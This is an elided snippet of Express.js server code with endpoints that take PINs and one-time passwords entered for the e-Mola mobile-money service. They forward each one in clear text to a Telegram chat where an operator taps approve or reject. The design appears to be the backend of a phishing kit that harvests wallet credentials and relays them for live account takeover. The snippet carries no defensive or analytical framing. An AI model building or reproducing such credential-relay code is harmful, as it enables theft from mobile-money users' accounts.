...
app.post('/api/send-pin', async (req, res) => {
  ...
  const message = `PIN VERIFICATION (e-Mola)\nID: ${applicationId}\nPIN Entered: ${pin}\n\nApprove or reject:`;
  const buttons = [[
...
app.post('/api/send-otp', async (req, res) => {
  ...
  const message = `OTP VERIFICATION (e-Mola)\nID: ${applicationId}\nOTP Entered: ${otp}\n\nApprove or reject:`;
  const buttons = [[
...
app.post('/api/resend-otp', async (req, res) => {
  ...
  const message = `OTP RESENT - ADMIN ACTION REQUIRED (e-Mola)\nID: ${applicationId}\nNew OTP requested.\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref }) }
  ]];
...
app.post('/api/telegram-webhook', async (req, res) => {
  ...
  if (update.callback_query) {
    ...
    await sendTelegramMessage(`Status Update (e-Mola)\nID: ${appId}\nStep: ${s}\nAction: ${a}`);
    return res.sendStatus(200);
  }
